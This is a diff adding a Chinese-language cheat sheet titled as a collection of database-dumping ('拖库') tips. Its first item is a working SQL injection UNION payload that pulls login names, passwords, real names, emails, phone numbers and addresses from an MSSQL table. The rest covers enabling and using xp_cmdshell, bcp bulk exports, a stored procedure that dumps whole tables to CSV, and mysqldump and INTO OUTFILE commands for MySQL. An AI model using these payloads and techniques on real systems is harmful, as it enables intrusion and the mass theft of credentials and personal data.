@@ -1,0 +1,102 @@
+拖库经验技巧集合
+
+@mssql：
+【1】射点导出
+' and 1=2 union select 1,char(94)+CaSt(Loginname as varchar)+char(94)+CaSt(password as varchar)+char(94)+CaSt(trueName as varchar)+char(94)+CaSt(email as varchar)+char(94)+CaSt(phone as varchar)+char(94)+CaSt(fax as varchar)+char(94)+cast(companyName as varchar)+char(94)+CaSt(province as varchar)+char(94)+CaSt(address as varchar)+char(94)+CaSt(postalcode as varchar)+char(94)+CaSt(organization as varchar)+char(94)+char(94)+CaSt(interest as varchar),3,4 from (select top 5000 * from (select top 10000 * from xxx.dbo.xxx order by id desc) as tr order by id) as ar order by id desc--
+【2】a tool ： bcp
+整个表导出(out)
+bcp 数据库名.dbo.表名 out c:\currency.txt -S"数据库实例" -U"用户" -P"密码" -c
+
+--使用SQL语句导出(queryout)
+bcp "select * from 数据库名.dbo.表名" queryout c:\currency.txt -S 数据库实例 -U"用户" -P"密码" -c
+
+--设置字段分隔符和行分隔符(-c -t"," -r"\n"),不想输入字段类型等请配合-c一起使用
+bcp "select * from 数据库名.dbo.表名" queryout c:\currency.txt -S 数据库实例 -U"用户" -P"密码" -c -t"," -r"\n"
+
+--指定每批导入数据的行数、指定服务器发出或接收的每个网络数据包的字节数(-k -b5000 -a65535)
+bcp "select * from 数据库名.dbo.表名" queryout c:\currency.txt -S 数据库实例 -U"用户" -P"密码" -c -t"," -r"\n" -k -b5000 -a65535
+
+--在查询分析器上执行(EXEC master..xp_cmdshell)
+EXEC master..xp_cmdshell 'bcp "select * from 数据库名.dbo.表名" queryout c:\currency.txt -S 数据库实例 -U"用户" -P"密码" -c'
+--把SQL语句生成一个.sql文件，然后调用
+--注：路径的文件夹名称中间不能有空格
+exec master..xp_cmdshell 'osql -S 数据库实例 -U 用户 -P 密码 -i C:\cmdshellTest.sql'
+--将数据导入到currency表中
+EXEC master..xp_cmdshell 'bcp 数据库名.dbo.表名 in c:\currency.txt -c -T'
+--导入数据也同样可以使用-F和-L选项来选择导入数据的记录行。
+EXEC master..xp_cmdshell 'bcp 数据库名.dbo.表名 in c:\currency.txt -c -F 10 -L 13 -T'
+在使用命令xp_cmdshell的时候需要设置权限：
+
+/*MSsql2005 如何启用xp_cmdshell
+默认情况下,sql server2005安装完后,xp_cmdshell是禁用的(可能是安全考虑),如果要使用它,可按以下步骤
+*/
+-- 允许配置高级选项
+EXEC sp_configure 'show advanced options', 1
+GO
+-- 重新配置
+RECONFIGURE
+GO
+-- 启用xp_cmdshell
+EXEC sp_configure 'xp_cmdshell', 1
+GO
+--重新配置
+RECONFIGURE
+GO
+--执行想要的xp_cmdshell语句
+Exec xp_cmdshell 'query user'
+GO
+--用完后,要记得将xp_cmdshell禁用(出于安全考虑)
+-- 允许配置高级选项
+EXEC sp_configure 'show advanced options', 1
+GO
+-- 重新配置
+RECONFIGURE
+GO
+-- 禁用xp_cmdshell
+EXEC sp_configure 'xp_cmdshell', 0
+GO
+--重新配置
+RECONFIGURE
+GO
+【3】存储过程
+/*
+CREATE PROCEDURE TabToCsv
+@tb_name varchar(20),@dir varchar(40)
+AS
+BEGIN
+declare @sql nvarchar(200);
+declare @rowcount int,@i int,@num int,@numblock int,@numlast int;
+--获取表记录数
+set @sql = 'select @rowcount=count(*) from ' + @tb_name;
+exec sp_executesql @sql,N'@rowcount int output',@rowcount output;
+--定义变量初始值
+select @i = 0,@num = 0;
+set @numblock = @rowcount / 60000;
+set @numlast = @rowcount % 60000;
+--处理大量记录
+WHILE (@i < @numblock)
+BEGIN
+set @num = @num + 60000;
+set @sql = 'bcp "select top 60000 * from (select top ' + cast(@num as varchar(20)) + ' * from ' + @tb_name + ' order by 1)t order by 1 desc" queryout ' + @dir + cast(@i as varchar(10)) + '.csv -q -c -t "," -T';
+exec master..xp_cmdshell @sql,no_output;
+--print @sql;
+set @i = @i + 1;
+END;
+--处理余记录
+set @sql = 'bcp "select top ' + cast(@numlast as varchar(6)) + ' * from (select top ' + cast(@rowcount as varchar(20)) + ' * from ' + @tb_name + ' order by 1)t order by 1 desc" queryout ' + @dir + cast(@i as varchar(10)) + '.csv -q -c -t "," -T';
+exec master..xp_cmdshell @sql,no_output;
+--print @sql;
+END
+*/
+--drop procedure tabtocsv
+exec TabToCsv 'test.dbo.c_tmp','D:\';
+
+@mysql：
+【1】
+mysqldump -u user -p pass db_name tab_name -w "id between 1 and 1000" > /tmp/1.sql
+【2】
+mysqldump -u user -p pass db_name tab_name -w "1=1 limit 3000" >/tmp/2.sql
+【3】
+mysql>select col1,col2,col3 from tab_name limit 300 into outfile '/tmp/3.sql';
+【4】
+create table user2 select col1,col2 from user1; 
